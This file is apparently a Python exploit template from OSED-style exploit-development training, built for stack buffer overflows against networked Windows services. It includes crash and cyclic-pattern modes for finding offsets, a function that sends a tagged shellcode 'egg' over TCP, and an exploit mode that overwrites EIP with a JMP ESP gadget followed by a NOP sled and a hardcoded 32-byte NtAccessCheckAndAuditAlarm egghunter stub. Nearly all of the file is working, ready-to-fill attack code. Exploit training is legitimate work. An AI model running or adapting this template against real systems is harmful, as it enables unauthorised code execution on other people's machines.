#!/usr/bin/env python3
"""Egghunter exploit template.

When the buffer that overwrites EIP is too small for shellcode, use an
egghunter: a tiny stub (~32 bytes) that searches memory for a 4-byte
tag repeated twice (e.g., w00tw00t), then jumps to the shellcode that
follows the tag.

Two payloads are needed:
  1. The egg + full shellcode, placed somewhere in memory (a different
     input field, earlier request, environment variable, etc.)
  2. The overflow with the egghunter stub after EIP/SEH overwrite

Run on Kali:
  python3 egghunter.py
"""
import socket
import struct
import sys

# ============================================================
# FILL THESE IN
# ============================================================
MODE = "crash"          # crash | pattern | offset | exploit

TARGET_HOST = "192.168.x.x"
TARGET_PORT = 9999
PROTOCOL    = "tcp"
OUTPUT_FILE = "payload.bin"

PREFIX = b""
SUFFIX = b""

CRASH_LENGTH   = 5000
PATTERN_LENGTH = 5000
OFFSET = 0
BADCHARS = [0x00]

# --- Egghunter ---
# The egg tag (4 bytes, repeated twice before shellcode)
EGG_TAG = b"w00t"

# JMP ESP or other redirect gadget
JMP_ESP = 0x00000000

# Egghunter stub -- NtAccessCheckAndAuditAlarm variant (32 bytes)
# This is the standard OSED egghunter. Replace if you need a different one.
# Tag bytes are at offsets 18-21 (the cmp dword).
EGGHUNTER = (
    b"\x66\x81\xca\xff\x0f"    # or dx, 0x0fff
    b"\x42"                      # inc edx
    b"\x52"                      # push edx
    b"\x6a\x02"                  # push 0x02
    b"\x58"                      # pop eax
    b"\xcd\x2e"                  # int 0x2e
    b"\x3c\x05"                  # cmp al, 0x05
    b"\x5a"                      # pop edx
    b"\x74\xef"                  # je short (back to or dx)
    b"\xb8" + EGG_TAG +          # mov eax, <tag>
    b"\x8b\xfa"                  # mov edi, edx
    b"\xaf"                      # scasd
    b"\x75\xea"                  # jne short (back to inc edx)
    b"\xaf"                      # scasd
    b"\x75\xe7"                  # jne short (back to inc edx)
    b"\xff\xe7"                  # jmp edi
)

NOP_SLED = 8

# --- Egg payload (stage 1) ---
# How to deliver the egg + shellcode to memory.
# This depends on the target -- it might be a different protocol field,
# a prior request, a filename, etc. Customize deliver_egg() below.

# Shellcode -- three options (tried in order):
#   1. SHELLCODE_ASM: Keystone assembly (requires keystone-engine)
#   2. SHELLCODE_FILE: path to shellcode.bin
#   3. SHELLCODE: raw bytes pasted inline
SHELLCODE_ASM = r"""
"""
SHELLCODE_FILE = ""
SHELLCODE = b""

# If the egg goes in a separate network request:
EGG_PREFIX = b""
EGG_SUFFIX = b""


# ============================================================
# TRANSPORT
# ============================================================
def send_payload(data):
    payload = PREFIX + data + SUFFIX
    print(f"[*] Payload: {len(payload)} bytes (data: {len(data)})")

    if PROTOCOL == "file":
        with open(OUTPUT_FILE, "wb") as f:
            f.write(payload)
        print(f"[+] Written to {OUTPUT_FILE}")
        return b""

    if PROTOCOL == "tcp":
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            # banner = s.recv(1024)
            s.sendall(payload)
            try:
                return s.recv(1024)
            except socket.timeout:
                return b""

    if PROTOCOL == "udp":
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(payload, (TARGET_HOST, TARGET_PORT))
        return b""

    raise ValueError(f"Unknown protocol: {PROTOCOL}")


def cyclic_pattern(length):
    out = bytearray()
    for a in range(26):
        for b in range(26):
            for c in range(10):
                out.append(0x41 + a)
                out.append(0x61 + b)
                out.append(0x30 + c)
                if len(out) >= length:
                    return bytes(out[:length])
    return bytes(out[:length])


def cyclic_find(value):
    pat = cyclic_pattern(max(PATTERN_LENGTH, 20000))
    needle = struct.pack("<I", value)
    off = pat.find(needle)
    if off < 0:
        print(f"[-] Value 0x{value:08x} not found in pattern")
    else:
        print(f"[+] Offset: {off}")
    return off


# ============================================================
# SHELLCODE ASSEMBLY (Keystone)
# ============================================================
def assemble_ks(asm_text):
    try:
        from keystone import Ks, KS_ARCH_X86, KS_MODE_32
    except ImportError:
        print("[-] keystone-engine not installed (pip install keystone-engine)")
        sys.exit(1)
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    cleaned = asm_text.replace("jmp short ", "jmp ")
    try:
        encoding, count = ks.asm(cleaned)
    except Exception as e:
        print(f"[-] Assembly failed: {e}")
        sys.exit(1)
    sc = bytes(encoding)
    print(f"[+] Assembled {count} instructions -> {len(sc)} bytes")
    return sc


def get_shellcode():
    asm = SHELLCODE_ASM.strip()
    if asm:
        return assemble_ks(asm)
    if SHELLCODE_FILE:
        with open(SHELLCODE_FILE, "rb") as f:
            sc = f.read()
        print(f"[+] Loaded {len(sc)} bytes from {SHELLCODE_FILE}")
        return sc
    if SHELLCODE:
        return SHELLCODE
    print("[-] No shellcode. Set SHELLCODE_ASM, SHELLCODE_FILE, or SHELLCODE.")
    sys.exit(1)


# ============================================================
# EGG DELIVERY
# ============================================================
def deliver_egg(sc):
    """Place the egg tag (twice) + shellcode into the target's memory.

    Customize this for your target. Common approaches:
      - Send in a separate protocol field in the same connection
      - Send in a prior request before the overflow
      - Include in environment or a file the target reads
    """
    egg_payload = EGG_PREFIX + EGG_TAG + EGG_TAG + sc + EGG_SUFFIX

    # Default: send as a separate TCP packet on the same port
    print(f"[*] Delivering egg ({len(egg_payload)} bytes)...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5.0)
        s.connect((TARGET_HOST, TARGET_PORT))
        # banner = s.recv(1024)
        s.sendall(egg_payload)
    print("[+] Egg delivered")


# ============================================================
# MODES
# ============================================================
def do_crash():
    print(f"[*] Sending {CRASH_LENGTH} bytes...")
    send_payload(b"A" * CRASH_LENGTH)

def do_pattern():
    print(f"[*] Sending cyclic pattern ({PATTERN_LENGTH} bytes)...")
    send_payload(cyclic_pattern(PATTERN_LENGTH))

def do_offset():
    print("[*] Paste the EIP value from the debugger (hex):")
    raw = input("    EIP = ").strip()
    cyclic_find(int(raw, 16))

def do_exploit():
    sc = get_shellcode()
    print(f"[*] Egghunter: {len(EGGHUNTER)} bytes")
    print(f"[*] Shellcode: {len(sc)} bytes")
    print(f"[*] JMP ESP:   0x{JMP_ESP:08x}")

    # Stage 1: deliver egg + shellcode
    deliver_egg(sc)

    input("[*] Press Enter to send the overflow with egghunter...")

    # Stage 2: overflow with egghunter
    buf = b"A" * OFFSET
    buf += struct.pack("<I", JMP_ESP)
    buf += b"\x90" * NOP_SLED
    buf += EGGHUNTER
    send_payload(buf)


MODES = {
    "crash": do_crash,
    "pattern": do_pattern,
    "offset": do_offset,
    "exploit": do_exploit,
}

if __name__ == "__main__":
    mode = MODE.lower()
    if mode not in MODES:
        print(f"[-] Unknown mode: {mode}")
        sys.exit(1)
    MODES[mode]()
